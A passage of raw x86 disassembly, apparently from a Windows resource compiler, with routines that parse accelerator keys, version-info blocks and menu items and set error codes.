  406cf0:	e8 a0 16 00 00       	call   0x408395
  406cf5:	ba 70 08 00 00       	mov    $0x870,%edx
  406cfa:	75 f2                	jne    0x406cee
  406cfc:	f8                   	clc
  406cfd:	c3                   	ret
  406cfe:	e8 06 d7 ff ff       	call   0x404409
  406d03:	72 24                	jb     0x406d29
  406d05:	74 22                	je     0x406d29
  406d07:	e8 f7 d5 ff ff       	call   0x404303
  406d0c:	72 1b                	jb     0x406d29
  406d0e:	ba 4a 08 00 04       	mov    $0x400084a,%edx
  406d13:	75 14                	jne    0x406d29
  406d15:	e8 bc de ff ff       	call   0x404bd6
  406d1a:	73 e2                	jae    0x406cfe
  406d1c:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  406d23:	e8 9b ff ff ff       	call   0x406cc3
  406d28:	c3                   	ret
  406d29:	f9                   	stc
  406d2a:	c3                   	ret
  406d2b:	c7 05 30 ab 40 00 00 	movl   $0x0,0x40ab30
  406d32:	00 00 00 
  406d35:	e8 c4 ff ff ff       	call   0x406cfe
  406d3a:	72 68                	jb     0x406da4
  406d3c:	e8 c8 d6 ff ff       	call   0x404409
  406d41:	72 61                	jb     0x406da4
  406d43:	74 5f                	je     0x406da4
  406d45:	e8 b9 d5 ff ff       	call   0x404303
  406d4a:	72 58                	jb     0x406da4
  406d4c:	75 17                	jne    0x406d65
  406d4e:	e8 5e 16 00 00       	call   0x4083b1
  406d53:	75 10                	jne    0x406d65
  406d55:	ba 3a 18 00 00       	mov    $0x183a,%edx
  406d5a:	83 3d 30 ab 40 00 00 	cmpl   $0x0,0x40ab30
  406d61:	74 7c                	je     0x406ddf
  406d63:	eb 7c                	jmp    0x406de1
  406d65:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  406d6c:	c7 05 cc aa 40 00 7c 	movl   $0x87c,0x40aacc
  406d73:	08 00 00 
  406d76:	e8 d7 d8 ff ff       	call   0x404652
  406d7b:	72 27                	jb     0x406da4
  406d7d:	a3 50 ab 40 00       	mov    %eax,0x40ab50
  406d82:	e8 da d7 ff ff       	call   0x404561
  406d87:	e8 7d d6 ff ff       	call   0x404409
  406d8c:	72 16                	jb     0x406da4
  406d8e:	74 2d                	je     0x406dbd
  406d90:	e8 6e d5 ff ff       	call   0x404303
  406d95:	72 1f                	jb     0x406db6
  406d97:	75 1d                	jne    0x406db6
  406d99:	e8 6a cd ff ff       	call   0x403b08
  406d9e:	73 06                	jae    0x406da6
  406da0:	09 d2                	or     %edx,%edx
  406da2:	74 12                	je     0x406db6
  406da4:	eb 39                	jmp    0x406ddf
  406da6:	e8 e3 cd ff ff       	call   0x403b8e
  406dab:	72 da                	jb     0x406d87
  406dad:	74 07                	je     0x406db6
  406daf:	e8 8c cf ff ff       	call   0x403d40
  406db4:	73 0e                	jae    0x406dc4
  406db6:	ba 75 08 00 04       	mov    $0x4000875,%edx
  406dbb:	eb 22                	jmp    0x406ddf
  406dbd:	e8 c5 e4 ff ff       	call   0x405287
  406dc2:	72 1b                	jb     0x406ddf
  406dc4:	ff 05 30 ab 40 00    	incl   0x40ab30
  406dca:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  406dd1:	00 00 00 
  406dd4:	e8 97 c0 ff ff       	call   0x402e70
  406dd9:	0f 83 5d ff ff ff    	jae    0x406d3c
  406ddf:	f9                   	stc
  406de0:	c3                   	ret
  406de1:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  406de8:	00 00 00 
  406deb:	f8                   	clc
  406dec:	c3                   	ret
  406ded:	80 7e 02 5f          	cmpb   $0x5f,0x2(%esi)
  406df1:	75 22                	jne    0x406e15
  406df3:	66 81 3e 56 4b       	cmpw   $0x4b56,(%esi)
  406df8:	75 1b                	jne    0x406e15
  406dfa:	83 c6 03             	add    $0x3,%esi
  406dfd:	83 eb 03             	sub    $0x3,%ebx
  406e00:	76 13                	jbe    0x406e15
  406e02:	83 fb 01             	cmp    $0x1,%ebx
  406e05:	74 0e                	je     0x406e15
  406e07:	b8 30 d2 40 00       	mov    $0x40d230,%eax
  406e0c:	e8 6d 13 00 00       	call   0x40817e
  406e11:	72 02                	jb     0x406e15
  406e13:	f8                   	clc
  406e14:	c3                   	ret
  406e15:	f9                   	stc
  406e16:	c3                   	ret
  406e17:	83 fb 01             	cmp    $0x1,%ebx
  406e1a:	75 04                	jne    0x406e20
  406e1c:	31 c0                	xor    %eax,%eax
  406e1e:	8a 06                	mov    (%esi),%al
  406e20:	c3                   	ret
  406e21:	66 c7 05 bc ab 40 00 	movw   $0x0,0x40abbc
  406e28:	00 00 
  406e2a:	e8 da d5 ff ff       	call   0x404409
  406e2f:	72 37                	jb     0x406e68
  406e31:	75 40                	jne    0x406e73
  406e33:	80 0d c5 ab 40 00 02 	orb    $0x2,0x40abc5
  406e3a:	e8 48 e4 ff ff       	call   0x405287
  406e3f:	72 27                	jb     0x406e68
  406e41:	75 25                	jne    0x406e68
  406e43:	80 3e 5e             	cmpb   $0x5e,(%esi)
  406e46:	75 22                	jne    0x406e6a
  406e48:	66 83 0d bc ab 40 00 	orw    $0x0,0x40abbc
  406e4f:	00 
  406e50:	46                   	inc    %esi
  406e51:	4b                   	dec    %ebx
  406e52:	74 5c                	je     0x406eb0
  406e54:	e8 be ff ff ff       	call   0x406e17
  406e59:	75 55                	jne    0x406eb0
  406e5b:	ba 6d 08 00 00       	mov    $0x86d,%edx
  406e60:	3c 5a                	cmp    $0x5a,%al
  406e62:	77 04                	ja     0x406e68
  406e64:	2c 40                	sub    $0x40,%al
  406e66:	77 4f                	ja     0x406eb7
  406e68:	eb 4b                	jmp    0x406eb5
  406e6a:	e8 a8 ff ff ff       	call   0x406e17
  406e6f:	75 3f                	jne    0x406eb0
  406e71:	eb 44                	jmp    0x406eb7
  406e73:	e8 8b d4 ff ff       	call   0x404303
  406e78:	72 36                	jb     0x406eb0
  406e7a:	74 10                	je     0x406e8c
  406e7c:	e8 4b cd ff ff       	call   0x403bcc
  406e81:	72 2d                	jb     0x406eb0
  406e83:	e8 17 ce ff ff       	call   0x403c9f
  406e88:	72 2b                	jb     0x406eb5
  406e8a:	eb 2b                	jmp    0x406eb7
  406e8c:	e8 5c ff ff ff       	call   0x406ded
  406e91:	73 24                	jae    0x406eb7
  406e93:	e8 70 cc ff ff       	call   0x403b08
  406e98:	73 06                	jae    0x406ea0
  406e9a:	09 d2                	or     %edx,%edx
  406e9c:	75 17                	jne    0x406eb5
  406e9e:	eb 10                	jmp    0x406eb0
  406ea0:	e8 e9 cc ff ff       	call   0x403b8e
  406ea5:	72 83                	jb     0x406e2a
  406ea7:	74 da                	je     0x406e83
  406ea9:	e8 92 ce ff ff       	call   0x403d40
  406eae:	73 93                	jae    0x406e43
  406eb0:	ba 6a 08 00 00       	mov    $0x86a,%edx
  406eb5:	f9                   	stc
  406eb6:	c3                   	ret
  406eb7:	c7 05 a8 aa 40 00 00 	movl   $0x0,0x40aaa8
  406ebe:	00 00 00 
  406ec1:	8b 15 78 aa 40 00    	mov    0x40aa78,%edx
  406ec7:	66 89 42 02          	mov    %ax,0x2(%edx)
  406ecb:	e8 91 d6 ff ff       	call   0x404561
  406ed0:	72 e3                	jb     0x406eb5
  406ed2:	c7 05 cc aa 40 00 6b 	movl   $0x86b,0x40aacc
  406ed9:	08 00 00 
  406edc:	e8 71 d7 ff ff       	call   0x404652
  406ee1:	72 d2                	jb     0x406eb5
  406ee3:	8b 15 78 aa 40 00    	mov    0x40aa78,%edx
  406ee9:	66 89 42 04          	mov    %ax,0x4(%edx)
  406eed:	e8 6f d6 ff ff       	call   0x404561
  406ef2:	e8 12 d5 ff ff       	call   0x404409
  406ef7:	72 bc                	jb     0x406eb5
  406ef9:	74 46                	je     0x406f41
  406efb:	51                   	push   %ecx
  406efc:	57                   	push   %edi
  406efd:	e8 01 d4 ff ff       	call   0x404303
  406f02:	72 b1                	jb     0x406eb5
  406f04:	75 25                	jne    0x406f2b
  406f06:	e8 a6 14 00 00       	call   0x4083b1
  406f0b:	74 29                	je     0x406f36
  406f0d:	66 81 3e 56 4b       	cmpw   $0x4b56,(%esi)
  406f12:	74 17                	je     0x406f2b
  406f14:	b8 8c d2 40 00       	mov    $0x40d28c,%eax
  406f19:	e8 60 12 00 00       	call   0x40817e
  406f1e:	72 0b                	jb     0x406f2b
  406f20:	66 09 05 bc ab 40 00 	or     %ax,0x40abbc
  406f27:	5a                   	pop    %edx
  406f28:	5a                   	pop    %edx
  406f29:	eb c2                	jmp    0x406eed
  406f2b:	5f                   	pop    %edi
  406f2c:	59                   	pop    %ecx
  406f2d:	ba 6c 08 00 00       	mov    $0x86c,%edx
  406f32:	73 0d                	jae    0x406f41
  406f34:	eb 21                	jmp    0x406f57
  406f36:	5a                   	pop    %edx
  406f37:	5a                   	pop    %edx
  406f38:	66 81 0d bc ab 40 00 	orw    $0x80,0x40abbc
  406f3f:	80 00 
  406f41:	66 a1 bc ab 40 00    	mov    0x40abbc,%ax
  406f47:	8b 15 78 aa 40 00    	mov    0x40aa78,%edx
  406f4d:	66 89 02             	mov    %ax,(%edx)
  406f50:	83 05 78 aa 40 00 08 	addl   $0x8,0x40aa78
  406f57:	c3                   	ret
  406f58:	e8 a1 fd ff ff       	call   0x406cfe
  406f5d:	72 3e                	jb     0x406f9d
  406f5f:	ba 00 08 00 00       	mov    $0x800,%edx
  406f64:	e8 d1 de ff ff       	call   0x404e3a
  406f69:	72 32                	jb     0x406f9d
  406f6b:	c6 05 be ab 40 00 00 	movb   $0x0,0x40abbe
  406f72:	fe 05 be ab 40 00    	incb   0x40abbe
  406f78:	79 13                	jns    0x406f8d
  406f7a:	ba 00 08 00 00       	mov    $0x800,%edx
  406f7f:	e8 5c de ff ff       	call   0x404de0
  406f84:	72 17                	jb     0x406f9d
  406f86:	c6 05 be ab 40 00 00 	movb   $0x0,0x40abbe
  406f8d:	e8 8f fe ff ff       	call   0x406e21
  406f92:	72 09                	jb     0x406f9d
  406f94:	a8 80                	test   $0x80,%al
  406f96:	74 da                	je     0x406f72
  406f98:	e8 ff f2 ff ff       	call   0x40629c
  406f9d:	c3                   	ret
  406f9e:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  406fa4:	83 c2 02             	add    $0x2,%edx
  406fa7:	e8 8c e4 ff ff       	call   0x405438
  406fac:	72 54                	jb     0x407002
  406fae:	e8 ae d5 ff ff       	call   0x404561
  406fb3:	72 4d                	jb     0x407002
  406fb5:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  406fbb:	e8 78 e4 ff ff       	call   0x405438
  406fc0:	72 40                	jb     0x407002
  406fc2:	74 3e                	je     0x407002
  406fc4:	83 05 e8 aa 40 00 04 	addl   $0x4,0x40aae8
  406fcb:	e8 91 d5 ff ff       	call   0x404561
  406fd0:	72 30                	jb     0x407002
  406fd2:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  406fd8:	83 c2 02             	add    $0x2,%edx
  406fdb:	e8 58 e4 ff ff       	call   0x405438
  406fe0:	72 20                	jb     0x407002
  406fe2:	74 1e                	je     0x407002
  406fe4:	e8 78 d5 ff ff       	call   0x404561
  406fe9:	72 17                	jb     0x407002
  406feb:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  406ff1:	e8 42 e4 ff ff       	call   0x405438
  406ff6:	72 0a                	jb     0x407002
  406ff8:	74 08                	je     0x407002
  406ffa:	83 05 e8 aa 40 00 04 	addl   $0x4,0x40aae8
  407001:	c3                   	ret
  407002:	f9                   	stc
  407003:	c3                   	ret
  407004:	89 3d 10 ab 40 00    	mov    %edi,0x40ab10
  40700a:	89 15 f0 aa 40 00    	mov    %edx,0x40aaf0
  407010:	c7 05 b4 aa 40 00 00 	movl   $0x0,0x40aab4
  407017:	00 00 00 
  40701a:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  407021:	eb 09                	jmp    0x40702c
  407023:	e8 e1 d3 ff ff       	call   0x404409
  407028:	72 6b                	jb     0x407095
  40702a:	74 74                	je     0x4070a0
  40702c:	c6 05 c0 ab 40 00 00 	movb   $0x0,0x40abc0
  407033:	8a 15 c5 ab 40 00    	mov    0x40abc5,%dl
  407039:	e8 40 d1 ff ff       	call   0x40417e
  40703e:	72 60                	jb     0x4070a0
  407040:	a2 c0 ab 40 00       	mov    %al,0x40abc0
  407045:	e8 bf d3 ff ff       	call   0x404409
  40704a:	72 49                	jb     0x407095
  40704c:	74 52                	je     0x4070a0
  40704e:	e8 b0 d2 ff ff       	call   0x404303
  407053:	72 44                	jb     0x407099
  407055:	74 0e                	je     0x407065
  407057:	e8 70 cb ff ff       	call   0x403bcc
  40705c:	72 3b                	jb     0x407099
  40705e:	e8 1b cc ff ff       	call   0x403c7e
  407063:	eb 1c                	jmp    0x407081
  407065:	a1 f0 aa 40 00       	mov    0x40aaf0,%eax
  40706a:	e8 73 11 00 00       	call   0x4081e2
  40706f:	73 10                	jae    0x407081
  407071:	e8 92 ca ff ff       	call   0x403b08
  407076:	72 21                	jb     0x407099
  407078:	e8 11 cb ff ff       	call   0x403b8e
  40707d:	72 c6                	jb     0x407045
  40707f:	75 18                	jne    0x407099
  407081:	8b 15 b4 aa 40 00    	mov    0x40aab4,%edx
  407087:	e8 4c d0 ff ff       	call   0x4040d8
  40708c:	72 20                	jb     0x4070ae
  40708e:	a3 b4 aa 40 00       	mov    %eax,0x40aab4
  407093:	eb 8e                	jmp    0x407023
  407095:	e3 09                	jecxz  0x4070a0
  407097:	eb 15                	jmp    0x4070ae
  407099:	80 0d c8 ab 40 00 04 	orb    $0x4,0x40abc8
  4070a0:	f6 05 c5 ab 40 00 08 	testb  $0x8,0x40abc5
  4070a7:	75 0e                	jne    0x4070b7
  4070a9:	ba 79 28 00 04       	mov    $0x4002879,%edx
  4070ae:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  4070b5:	f9                   	stc
  4070b6:	c3                   	ret
  4070b7:	80 25 c5 ab 40 00 f7 	andb   $0xf7,0x40abc5
  4070be:	c3                   	ret
  4070bf:	89 15 f0 aa 40 00    	mov    %edx,0x40aaf0
  4070c5:	e8 3f d3 ff ff       	call   0x404409
  4070ca:	72 4d                	jb     0x407119
  4070cc:	74 4b                	je     0x407119
  4070ce:	e8 30 d2 ff ff       	call   0x404303
  4070d3:	72 44                	jb     0x407119
  4070d5:	74 20                	je     0x4070f7
  4070d7:	e8 f0 ca ff ff       	call   0x403bcc
  4070dc:	72 3b                	jb     0x407119
  4070de:	e8 9b cb ff ff       	call   0x403c7e
  4070e3:	eb 2c                	jmp    0x407111
  4070e5:	e8 1e ca ff ff       	call   0x403b08
  4070ea:	72 2d                	jb     0x407119
  4070ec:	e8 9d ca ff ff       	call   0x403b8e
  4070f1:	72 d2                	jb     0x4070c5
  4070f3:	74 e9                	je     0x4070de
  4070f5:	eb 22                	jmp    0x407119
  4070f7:	a1 f0 aa 40 00       	mov    0x40aaf0,%eax
  4070fc:	e8 e1 10 00 00       	call   0x4081e2
  407101:	72 e2                	jb     0x4070e5
  407103:	f6 05 c8 ab 40 00 10 	testb  $0x10,0x40abc8
  40710a:	74 05                	je     0x407111
  40710c:	e8 a4 e4 ff ff       	call   0x4055b5
  407111:	80 25 c8 ab 40 00 ef 	andb   $0xef,0x40abc8
  407118:	c3                   	ret
  407119:	80 25 c8 ab 40 00 ef 	andb   $0xef,0x40abc8
  407120:	f9                   	stc
  407121:	c3                   	ret
  407122:	2c 06                	sub    $0x6,%al
  407124:	75 1f                	jne    0x407145
  407126:	ba 2f d4 40 00       	mov    $0x40d42f,%edx
  40712b:	80 0d c8 ab 40 00 10 	orb    $0x10,0x40abc8
  407132:	e8 88 ff ff ff       	call   0x4070bf
  407137:	72 2c                	jb     0x407165
  407139:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  40713f:	89 42 20             	mov    %eax,0x20(%edx)
  407142:	31 d2                	xor    %edx,%edx
  407144:	c3                   	ret
  407145:	fe c8                	dec    %al
  407147:	74 1c                	je     0x407165
  407149:	fe c8                	dec    %al
  40714b:	75 1a                	jne    0x407167
  40714d:	ba 9b d4 40 00       	mov    $0x40d49b,%edx
  407152:	e8 68 ff ff ff       	call   0x4070bf
  407157:	72 0c                	jb     0x407165
  407159:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  40715f:	89 42 24             	mov    %eax,0x24(%edx)
  407162:	31 d2                	xor    %edx,%edx
  407164:	c3                   	ret
  407165:	f9                   	stc
  407166:	c3                   	ret
  407167:	fe c8                	dec    %al
  407169:	75 26                	jne    0x407191
  40716b:	e8 99 d2 ff ff       	call   0x404409
  407170:	72 f3                	jb     0x407165
  407172:	74 f1                	je     0x407165
  407174:	ba 74 d3 40 00       	mov    $0x40d374,%edx
  407179:	e8 86 fe ff ff       	call   0x407004
  40717e:	72 e5                	jb     0x407165
  407180:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  407186:	a1 b4 aa 40 00       	mov    0x40aab4,%eax
  40718b:	89 42 1c             	mov    %eax,0x1c(%edx)
  40718e:	09 c9                	or     %ecx,%ecx
  407190:	c3                   	ret
  407191:	fe c8                	dec    %al
  407193:	75 18                	jne    0x4071ad
  407195:	ba 87 d5 40 00       	mov    $0x40d587,%edx
  40719a:	e8 20 ff ff ff       	call   0x4070bf
  40719f:	72 c4                	jb     0x407165
  4071a1:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  4071a7:	89 42 28             	mov    %eax,0x28(%edx)
  4071aa:	31 d2                	xor    %edx,%edx
  4071ac:	c3                   	ret
  4071ad:	fe c8                	dec    %al
  4071af:	75 19                	jne    0x4071ca
  4071b1:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  4071b7:	83 c2 08             	add    $0x8,%edx
  4071ba:	89 15 e8 aa 40 00    	mov    %edx,0x40aae8
  4071c0:	e8 d9 fd ff ff       	call   0x406f9e
  4071c5:	72 9e                	jb     0x407165
  4071c7:	31 d2                	xor    %edx,%edx
  4071c9:	c3                   	ret
  4071ca:	fe c8                	dec    %al
  4071cc:	74 1c                	je     0x4071ea
  4071ce:	fe c8                	dec    %al
  4071d0:	75 1a                	jne    0x4071ec
  4071d2:	ba cb d5 40 00       	mov    $0x40d5cb,%edx
  4071d7:	e8 e3 fe ff ff       	call   0x4070bf
  4071dc:	72 0c                	jb     0x4071ea
  4071de:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  4071e4:	89 42 18             	mov    %eax,0x18(%edx)
  4071e7:	31 d2                	xor    %edx,%edx
  4071e9:	c3                   	ret
  4071ea:	f9                   	stc
  4071eb:	c3                   	ret
  4071ec:	fe c8                	dec    %al
  4071ee:	75 fa                	jne    0x4071ea
  4071f0:	8b 15 e4 aa 40 00    	mov    0x40aae4,%edx
  4071f6:	83 c2 10             	add    $0x10,%edx
  4071f9:	89 15 e8 aa 40 00    	mov    %edx,0x40aae8
  4071ff:	e8 9a fd ff ff       	call   0x406f9e
  407204:	72 e4                	jb     0x4071ea
  407206:	31 d2                	xor    %edx,%edx
  407208:	c3                   	ret
  407209:	56                   	push   %esi
  40720a:	a3 78 aa 40 00       	mov    %eax,0x40aa78
  40720f:	2b 05 e4 aa 40 00    	sub    0x40aae4,%eax
  407215:	8b 35 dc aa 40 00    	mov    0x40aadc,%esi
  40721b:	80 fa 01             	cmp    $0x1,%dl
  40721e:	75 02                	jne    0x407222
  407220:	d1 e8                	shr    $1,%eax
  407222:	66 89 46 02          	mov    %ax,0x2(%esi)
  407226:	88 56 04             	mov    %dl,0x4(%esi)
  407229:	5e                   	pop    %esi
  40722a:	c3                   	ret
  40722b:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  407230:	29 d0                	sub    %edx,%eax
  407232:	66 89 02             	mov    %ax,(%edx)
  407235:	c3                   	ret
  407236:	89 c6                	mov    %eax,%esi
  407238:	e8 eb db ff ff       	call   0x404e28
  40723d:	89 35 e4 aa 40 00    	mov    %esi,0x40aae4
  407243:	89 35 e8 aa 40 00    	mov    %esi,0x40aae8
  407249:	c3                   	ret
  40724a:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407250:	83 c2 06             	add    $0x6,%edx
  407253:	c7 05 cc aa 40 00 85 	movl   $0x885,0x40aacc
  40725a:	08 00 00 
  40725d:	e8 1b e1 ff ff       	call   0x40537d
  407262:	72 31                	jb     0x407295
  407264:	e8 cd ff ff ff       	call   0x407236
  407269:	b2 01                	mov    $0x1,%dl
  40726b:	a1 e8 aa 40 00       	mov    0x40aae8,%eax
  407270:	e8 94 ff ff ff       	call   0x407209
  407275:	e8 8f d1 ff ff       	call   0x404409
  40727a:	72 19                	jb     0x407295
  40727c:	74 17                	je     0x407295
  40727e:	e8 80 d0 ff ff       	call   0x404303
  407283:	72 10                	jb     0x407295
  407285:	75 09                	jne    0x407290
  407287:	e8 09 11 00 00       	call   0x408395
  40728c:	75 02                	jne    0x407290
  40728e:	f8                   	clc
  40728f:	c3                   	ret
  407290:	ba 70 08 00 00       	mov    $0x870,%edx
  407295:	f9                   	stc
  407296:	c3                   	ret
  407297:	e8 c7 db ff ff       	call   0x404e63
  40729c:	72 3f                	jb     0x4072dd
  40729e:	89 f2                	mov    %esi,%edx
  4072a0:	83 c2 06             	add    $0x6,%edx
  4072a3:	c7 05 cc aa 40 00 86 	movl   $0x886,0x40aacc
  4072aa:	08 00 00 
  4072ad:	e8 cb e0 ff ff       	call   0x40537d
  4072b2:	72 29                	jb     0x4072dd
  4072b4:	e8 7d ff ff ff       	call   0x407236
  4072b9:	e8 a3 d2 ff ff       	call   0x404561
  4072be:	72 1d                	jb     0x4072dd
  4072c0:	e8 44 d1 ff ff       	call   0x404409
  4072c5:	72 16                	jb     0x4072dd
  4072c7:	74 7c                	je     0x407345
  4072c9:	e8 35 d0 ff ff       	call   0x404303
  4072ce:	72 0d                	jb     0x4072dd
  4072d0:	75 5d                	jne    0x40732f
  4072d2:	e8 31 c8 ff ff       	call   0x403b08
  4072d7:	73 06                	jae    0x4072df
  4072d9:	09 d2                	or     %edx,%edx
  4072db:	74 4b                	je     0x407328
  4072dd:	eb 4e                	jmp    0x40732d
  4072df:	e8 aa c8 ff ff       	call   0x403b8e
  4072e4:	72 da                	jb     0x4072c0
  4072e6:	75 0b                	jne    0x4072f3
  4072e8:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  4072ee:	66 89 02             	mov    %ax,(%edx)
  4072f1:	eb 49                	jmp    0x40733c
  4072f3:	e8 48 ca ff ff       	call   0x403d40
  4072f8:	72 2e                	jb     0x407328
  4072fa:	eb 50                	jmp    0x40734c
  4072fc:	e8 60 d2 ff ff       	call   0x404561
  407301:	e8 03 d1 ff ff       	call   0x404409
  407306:	72 25                	jb     0x40732d
  407308:	74 23                	je     0x40732d
  40730a:	e8 f4 cf ff ff       	call   0x404303
  40730f:	72 1c                	jb     0x40732d
  407311:	75 1c                	jne    0x40732f
  407313:	e8 6b 10 00 00       	call   0x408383
  407318:	74 52                	je     0x40736c
  40731a:	e8 92 10 00 00       	call   0x4083b1
  40731f:	74 4b                	je     0x40736c
  407321:	e8 4b 10 00 00       	call   0x408371
  407326:	74 44                	je     0x40736c
  407328:	ba 86 08 00 00       	mov    $0x886,%edx
  40732d:	eb 57                	jmp    0x407386
  40732f:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  407335:	e8 57 e0 ff ff       	call   0x405391
  40733a:	72 4a                	jb     0x407386
  40733c:	83 05 e8 aa 40 00 02 	addl   $0x2,0x40aae8
  407343:	eb b7                	jmp    0x4072fc
  407345:	e8 3d df ff ff       	call   0x405287
  40734a:	72 3a                	jb     0x407386
  40734c:	8b 15 e8 aa 40 00    	mov    0x40aae8,%edx
  407352:	e8 f0 de ff ff       	call   0x405247
  407357:	b2 01                	mov    $0x1,%dl
  407359:	e8 ab fe ff ff       	call   0x407209
  40735e:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  407364:	e8 c2 fe ff ff       	call   0x40722b
  407369:	31 d2                	xor    %edx,%edx
  40736b:	c3                   	ret
  40736c:	31 d2                	xor    %edx,%edx
  40736e:	a1 e8 aa 40 00       	mov    0x40aae8,%eax
  407373:	e8 91 fe ff ff       	call   0x407209
  407378:	8b 15 dc aa 40 00    	mov    0x40aadc,%edx
  40737e:	e8 a8 fe ff ff       	call   0x40722b
  407383:	09 c9                	or     %ecx,%ecx
  407385:	c3                   	ret
  407386:	f9                   	stc
  407387:	c3                   	ret
  407388:	e8 7c d0 ff ff       	call   0x404409
  40738d:	72 46                	jb     0x4073d5
  40738f:	75 3f                	jne    0x4073d0
  407391:	80 0d c5 ab 40 00 02 	orb    $0x2,0x40abc5
  407398:	e8 ea de ff ff       	call   0x405287
  40739d:	72 31                	jb     0x4073d0
  40739f:	75 34                	jne    0x4073d5
  4073a1:	89 da                	mov    %ebx,%edx
  4073a3:	81 c2 00 02 00 00    	add    $0x200,%edx
  4073a9:	e8 8c da ff ff       	call   0x404e3a
  4073ae:	72 25                	jb     0x4073d5
  4073b0:	51                   	push   %ecx
  4073b1:	57                   	push   %edi
  4073b2:	8b 3d 78 aa 40 00    	mov    0x40aa78,%edi
  4073b8:	89 d9                	mov    %ebx,%ecx
  4073ba:	e3 02                	jecxz  0x4073be
  4073bc:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4073be:	c6 07 00             	movb   $0x0,(%edi)
  4073c1:	47                   	inc    %edi
  4073c2:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  4073c8:	5f                   	pop    %edi
  4073c9:	59                   	pop    %ecx
  4073ca:	e8 cd ee ff ff       	call   0x40629c
  4073cf:	c3                   	ret
  4073d0:	ba 41 08 00 00       	mov    $0x841,%edx
  4073d5:	f9                   	stc
  4073d6:	c3                   	ret
  4073d7:	ba 00 08 00 00       	mov    $0x800,%edx
  4073dc:	e8 59 da ff ff       	call   0x404e3a
  4073e1:	72 7b                	jb     0x40745e
  4073e3:	bb 0f 00 00 00       	mov    $0xf,%ebx
  4073e8:	be 6c ac 40 00       	mov    $0x40ac6c,%esi
  4073ed:	a1 78 aa 40 00       	mov    0x40aa78,%eax
  4073f2:	a3 dc aa 40 00       	mov    %eax,0x40aadc
  4073f7:	83 c0 06             	add    $0x6,%eax
  4073fa:	a3 d4 aa 40 00       	mov    %eax,0x40aad4
  4073ff:	e8 29 de ff ff       	call   0x40522d
  407404:	e8 2d fe ff ff       	call   0x407236
  407409:	c7 06 bd 04 ef fe    	movl   $0xfeef04bd,(%esi)
  40740f:	c7 46 04 00 00 01 00 	movl   $0x10000,0x4(%esi)
  407416:	eb 07                	jmp    0x40741f
  407418:	e8 70 e4 ff ff       	call   0x40588d
  40741d:	72 3f                	jb     0x40745e
  40741f:	e8 e5 cf ff ff       	call   0x404409
  407424:	72 38                	jb     0x40745e
  407426:	74 36                	je     0x40745e
  407428:	e8 d6 ce ff ff       	call   0x404303
  40742d:	ba 70 08 00 00       	mov    $0x870,%edx
  407432:	72 2a                	jb     0x40745e
  407434:	75 28                	jne    0x40745e
  407436:	e8 5a 0f 00 00       	call   0x408395
  40743b:	74 23                	je     0x407460
  40743d:	b8 04 d3 40 00       	mov    $0x40d304,%eax
  407442:	e8 37 0d 00 00       	call   0x40817e
  407447:	ba 76 28 00 04       	mov    $0x4002876,%edx
  40744c:	72 10                	jb     0x40745e
  40744e:	e8 cf fc ff ff       	call   0x407122
  407453:	72 04                	jb     0x407459
  407455:	75 d1                	jne    0x407428
  407457:	eb bf                	jmp    0x407418
  407459:	ba 77 08 00 00       	mov    $0x877,%edx
  40745e:	f9                   	stc
  40745f:	c3                   	ret
  407460:	8f 05 3c ab 40 00    	pop    0x40ab3c
  407466:	89 25 38 ab 40 00    	mov    %esp,0x40ab38
  40746c:	ff 35 dc aa 40 00    	push   0x40aadc
  407472:	a1 e4 aa 40 00       	mov    0x40aae4,%eax
  407477:	83 c0 34             	add    $0x34,%eax
  40747a:	30 d2                	xor    %dl,%dl
  40747c:	e8 88 fd ff ff       	call   0x407209
  407481:	c7 05 34 ab 40 00 00 	movl   $0x0,0x40ab34
  407488:	00 00 00 
  40748b:	e8 79 cf ff ff       	call   0x404409
  407490:	72 5c                	jb     0x4074ee
  407492:	74 5a                	je     0x4074ee
  407494:	e8 6a ce ff ff       	call   0x404303
  407499:	72 53                	jb     0x4074ee
  40749b:	75 4c                	jne    0x4074e9
  40749d:	e8 0f 0f 00 00       	call   0x4083b1
  4074a2:	75 10                	jne    0x4074b4
  4074a4:	ff 0d 34 ab 40 00    	decl   0x40ab34
  4074aa:	78 50                	js     0x4074fc
  4074ac:	5a                   	pop    %edx
  4074ad:	e8 79 fd ff ff       	call   0x40722b
  4074b2:	eb d7                	jmp    0x40748b
  4074b4:	e8 ca 0e 00 00       	call   0x408383
  4074b9:	75 0b                	jne    0x4074c6
  4074bb:	e8 d7 fd ff ff       	call   0x407297
  4074c0:	72 2c                	jb     0x4074ee
  4074c2:	75 d9                	jne    0x40749d
  4074c4:	eb c5                	jmp    0x40748b
  4074c6:	e8 a6 0e 00 00       	call   0x408371
  4074cb:	75 1c                	jne    0x4074e9
  4074cd:	e8 91 d9 ff ff       	call   0x404e63
  4074d2:	72 1a                	jb     0x4074ee
  4074d4:	ff 05 34 ab 40 00    	incl   0x40ab34
  4074da:	ff 35 dc aa 40 00    	push   0x40aadc
  4074e0:	e8 65 fd ff ff       	call   0x40724a
  4074e5:	72 07                	jb     0x4074ee
  4074e7:	eb a2                	jmp    0x40748b
  4074e9:	ba 7a 28 00 04       	mov    $0x400287a,%edx
  4074ee:	8b 25 38 ab 40 00    	mov    0x40ab38,%esp
  4074f4:	ff 35 3c ab 40 00    	push   0x40ab3c
  4074fa:	f9                   	stc
